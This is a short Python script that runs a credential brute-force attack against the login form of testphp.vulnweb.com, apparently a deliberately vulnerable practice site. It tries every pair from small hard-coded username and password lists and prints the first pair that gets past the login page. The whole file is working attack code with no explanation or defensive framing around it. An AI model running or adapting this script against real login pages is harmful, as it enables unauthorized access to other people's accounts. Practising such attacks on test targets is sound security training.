import requests
url = "http://testphp.vulnweb.com/userinfo.php"
usernames = ['test','best','chest','nest']
passwords = ['password','admin', 'superadmin','test','123456']
print("Brute force starting...")
for username in usernames:
    for password in passwords:
        print(f"Trying username: {username}, password: {password}")
        data = {"uname": username, "pass": password}
        
        response = requests.post(url, data=data)
        if '<input name="uname"' not in response.text:
            print(f"Successful login, credintials ==> username: {username}, password: {password}")
            exit()
        else:
            print("failed")      
print("no credintials found")